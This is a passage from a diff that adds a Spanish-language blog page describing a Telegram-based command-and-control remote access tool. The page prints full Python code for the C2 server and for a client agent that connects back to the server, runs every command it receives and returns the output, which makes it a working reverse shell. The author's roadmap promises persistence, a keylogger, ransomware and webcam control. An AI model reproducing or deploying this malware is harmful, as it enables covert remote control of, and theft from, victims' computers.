+</span></span><span style="display:flex;"><span>            bot<span style="color:#f92672">.</span>send_message(C2_CHANNEL_ID, <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[+] Respuesta del cliente:</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">{</span>response<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
+</span></span><span style="display:flex;"><span>            bot<span style="color:#f92672">.</span>send_message(C2_CHANNEL_ID, <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[!] Error con cliente: </span><span style="color:#e6db74">{</span>e<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Lanzamos el servidor en segundo plano y arrancamos el bot</span>
+</span></span><span style="display:flex;"><span>threading<span style="color:#f92672">.</span>Thread(target<span style="color:#f92672">=</span>start_server, daemon<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)<span style="color:#f92672">.</span>start()
+</span></span><span style="display:flex;"><span>bot<span style="color:#f92672">.</span>polling()
+</span></span></code></pre></div><h4 id="cliente">Cliente:<a hidden class="anchor" aria-hidden="true" href="#cliente">#</a></h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> socket
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> subprocess
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Configuración del servidor al que se conectará el cliente</span>
+</span></span><span style="display:flex;"><span>SERVER_IP <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;IP_DEL_SERVER&#34;</span>
+</span></span><span style="display:flex;"><span>SERVER_PORT <span style="color:#f92672">=</span> <span style="color:#ae81ff">9090</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">connect_to_server</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Creamos el socket y nos conectamos al servidor C2</span>
+</span></span><span style="display:flex;"><span>    client <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_STREAM)
+</span></span><span style="display:flex;"><span>    client<span style="color:#f92672">.</span>connect((SERVER_IP, SERVER_PORT))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># Esperamos un comando del servidor</span>
+</span></span><span style="display:flex;"><span>            command <span style="color:#f92672">=</span> client<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">4096</span>)<span style="color:#f92672">.</span>decode()
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> command:
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">break</span>  <span style="color:#75715e"># Si no hay comando, se rompe el bucle</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># Ejecutamos el comando recibido en el sistema</span>
+</span></span><span style="display:flex;"><span>            result <span style="color:#f92672">=</span> subprocess<span style="color:#f92672">.</span>getoutput(command)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># Enviamos el resultado de vuelta al servidor</span>
+</span></span><span style="display:flex;"><span>            client<span style="color:#f92672">.</span>send(result<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">except</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>  <span style="color:#75715e"># Si hay cualquier error, salimos del bucle</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    client<span style="color:#f92672">.</span>close()  <span style="color:#75715e"># Cerramos el socket si se sale del bucle</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Llamamos a la función para iniciar la conexión</span>
+</span></span><span style="display:flex;"><span>connect_to_server()
+</span></span></code></pre></div><h4 id="ejemplo-de-chat-con-este-código">Ejemplo de chat con este código:<a hidden class="anchor" aria-hidden="true" href="#ejemplo-de-chat-con-este-código">#</a></h4>
+<p><img alt="chat_inicial" loading="lazy" src="/images/C2_Over_Tg/chat_telegram_inicial.png"></p>
+<p>Esta estructura es muy básica y ya me empecé a dar cuenta de muchas cosas que se tenian que mejorar como por ejemplo:</p>
+<ul>
+<li>
+<p><strong>Creacion de diferentes canales por cliente</strong> para asi poder tener multiples a la vez y poder tener un canal de comunicaciones privado con cada uno de ellos</p>
+</li>
+<li>
+<p>Que no fueran comandos directos sino que hubieran ya multiples <strong>funcionalidades definidas</strong> como <strong>(/screenshot /download&hellip;)</strong></p>
+</li>
+<li>
+<p><strong>Cifrado fuerte de las comunicaciones</strong> para mayor seguridad y privacidad</p>
+</li>
+<li>
+<p><strong>Comandos globales a multiples clientes</strong> para poder lanzar quiza ataques distribuidos</p>
+</li>
+<li>
+<p>Tambien queria pasar toda la estructura del servidor a <strong>POO</strong> con <strong>clases</strong> para hacer mas bonito y eficiente el codigo</p>
+</li>
+</ul>
+<h2 id="mejoras">Mejoras<a hidden class="anchor" aria-hidden="true" href="#mejoras">#</a></h2>
+<p>Bascicamente lo primero que hice fue pasar todo a POO creando dos clases principales en el servidor</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">ClientSession</span>:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> __init__(self, socket, address):
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>socket <span style="color:#f92672">=</span> socket
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> address
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>ip <span style="color:#f92672">=</span> address[<span style="color:#ae81ff">0</span>]
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>username <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>os_version <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>topic_id <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">send_command</span>(self, command):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>socket<span style="color:#f92672">.</span>send(command<span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#34;utf-8&#34;</span>))
+</span></span><span style="display:flex;"><span>            response <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>socket<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">4096</span>)<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>)<span style="color:#f92672">.</span>strip()
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> response <span style="color:#66d9ef">if</span> response <span style="color:#66d9ef">else</span> <span style="color:#e6db74">&#34;[Sin respuesta]&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[!] Error executing the command: </span><span style="color:#e6db74">{</span>e<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">close</span>(self):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>socket<span style="color:#f92672">.</span>close()
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[!] Error closing the connection with </span><span style="color:#e6db74">{</span>self<span style="color:#f92672">.</span>ip<span style="color:#e6db74">}</span><span style="color:#e6db74">: </span><span style="color:#e6db74">{</span>e<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">C2Server</span>:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> __init__(self):
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>clients <span style="color:#f92672">=</span> {}
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>active_shell_sessions <span style="color:#f92672">=</span> {}
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>server <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        signal<span style="color:#f92672">.</span>signal(signal<span style="color:#f92672">.</span>SIGINT, self<span style="color:#f92672">.</span>shutdown)
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>init_db()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">init_db</span>(self):
+</span></span><span style="display:flex;"><span>        conn <span style="color:#f92672">=</span> sqlite3<span style="color:#f92672">.</span>connect(<span style="color:#e6db74">&#34;c2.db&#34;</span>)
+</span></span><span style="display:flex;"><span>        cursor <span style="color:#f92672">=</span> conn<span style="color:#f92672">.</span>cursor()
+</span></span><span style="display:flex;"><span>        cursor<span style="color:#f92672">.</span>execute(<span style="color:#e6db74">&#39;&#39;&#39;CREATE TABLE IF NOT EXISTS clients (
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                            id INTEGER PRIMARY KEY AUTOINCREMENT,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                            telegram_id TEXT,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                            ip TEXT,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                            username TEXT,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                            topic_id INTEGER)&#39;&#39;&#39;</span>)
+</span></span><span style="display:flex;"><span>        conn<span style="color:#f92672">.</span>commit()
+</span></span><span style="display:flex;"><span>        conn<span style="color:#f92672">.</span>close()
+</span></span></code></pre></div><ul>
+<li>
+<p>La primera clase se encarga gestionar y almacenar los datos de lo que sería en si la sessión de cada cliente</p>
+</li>
+<li>
+<p>La segunda clase sería donde primero inicializariamos la base de datos y luego definiriamos toda la logica y funciones de el servidor</p>
+</li>
+</ul>
+<hr>
+<p>Despues fui desarrollando lo que sería una base mas solida y ordenada de el sistema</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">start_server</span>(self):
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>server <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_STREAM)
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>server<span style="color:#f92672">.</span>setsockopt(socket<span style="color:#f92672">.</span>SOL_SOCKET, socket<span style="color:#f92672">.</span>SO_REUSEADDR, <span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>server<span style="color:#f92672">.</span>bind((C2_SERVER_IP, C2_SERVER_PORT))
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>server<span style="color:#f92672">.</span>listen(<span style="color:#ae81ff">5</span>)
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[C2] Servidor esperando conexiones en </span><span style="color:#e6db74">{</span>C2_SERVER_IP<span style="color:#e6db74">}</span><span style="color:#e6db74">:</span><span style="color:#e6db74">{</span>C2_SERVER_PORT<span style="color:#e6db74">}</span><span style="color:#e6db74">...&#34;</span>)
+</span></span><span style="display:flex;"><span>        bot<span style="color:#f92672">.</span>send_message(C2_CHANNEL_ID, <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;🚀 C2 Server Started at </span><span style="color:#e6db74">{</span>C2_SERVER_IP<span style="color:#e6db74">}</span><span style="color:#e6db74">:</span><span style="color:#e6db74">{</span>C2_SERVER_PORT<span style="color:#e6db74">}</span><span style="color:#e6db74"> 🚀</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, parse_mode<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Markdown&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>                client_socket, client_address <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>server<span style="color:#f92672">.</span>accept()
+</span></span><span style="display:flex;"><span>                print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[+] New connection </span><span style="color:#e6db74">{</span>client_address<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>                client_thread <span style="color:#f92672">=</span> threading<span style="color:#f92672">.</span>Thread(target<span style="color:#f92672">=</span>self<span style="color:#f92672">.</span>handle_client, args<span style="color:#f92672">=</span>(client_socket, client_address), daemon<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+</span></span><span style="display:flex;"><span>                client_thread<span style="color:#f92672">.</span>start()
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
+</span></span><span style="display:flex;"><span>                print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[C2] Error with the connection: </span><span style="color:#e6db74">{</span>e<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span></code></pre></div><p>Esta sería la función que se encarga de iniciar el servidor y de ponerse en espera de conexiones, a parte envia un mensaje al canal general del grupo para informar de que se ha iniciado</p>
+<h2 id="próximos-pasos">Próximos pasos<a hidden class="anchor" aria-hidden="true" href="#próximos-pasos">#</a></h2>
+<p>A partir de esta base fui mejorando el proyecto paso a paso: reestructurando el código, añadiendo nuevas funciones y centrándome sobre todo en hacerlo más estructurado y escalable. Lo que has visto aquí es solo el inicio, una especie de <strong>mínimo viable</strong> funcional.</p>
+<p>En el <a href="https://github.com/17tayyy/TgRAT">repositorio de GitHub</a> he dejado un <strong>roadmap</strong> con todas las mejoras que tengo previstas. Algunas de las más interesantes son:</p>
+<ul>
+<li>Sistema de autenticación para agentes (con clave precompartida o firmas).</li>
+<li>Persistencia del agente en el sistema (registro, tareas programadas…).</li>
+<li>Registro completo de los comandos ejecutados.</li>
+<li>Agrupación de bots por etiquetas (OS, localización, etc).</li>
+<li>Agente multiplataforma (Windows, Linux, MacOS).</li>
+<li>Funciones ofensivas avanzadas como <strong>keylogger</strong>, <strong>ransomware</strong> y <strong>control de webcam</strong>.</li>
+<li>Soporte para canales alternativos de C2 (Discord, API directa de Telegram&hellip;).</li>
+<li>Dashboard web opcional para gestionar bots y comandos en tiempo real.</li>
+</ul>
+<p>Y no, no es un proyecto que vaya a quedar tirado. Lo voy actualizando constantemente y me sirve tanto para aprender como para experimentar con ideas nuevas.<br>
+Esto es solo la primera entrega.</p>
+<p>Nos vemos en la siguiente 😈</p>
+<blockquote>
+<p>📬 ¿Tienes dudas, sugerencias o ideas para mejorar esto?
+Puedes abrir una issue o dejar un comentario en el repo. Me mola ver cómo otros lo enfocan.</p>
+</blockquote>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="http://localhost:1313/tags/command-and-control/">Command-and-Control</a></li>
+      <li><a href="http://localhost:1313/tags/ciberseguridad/">Ciberseguridad</a></li>
+      <li><a href="http://localhost:1313/tags/post/">Post</a></li>
+      <li><a href="http://localhost:1313/tags/python/">Python</a></li>
+    </ul>
+<nav class="paginav">
+  <a class="next" href="http://localhost:1313/posts/primer-post/">
+    <span class="title">Next »</span>
+    <br>
+    <span>¿Quién soy y qué hago aquí?</span>
+  </a>
+</nav>
+
+  </footer>
+</article>
+    </main>
+    
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
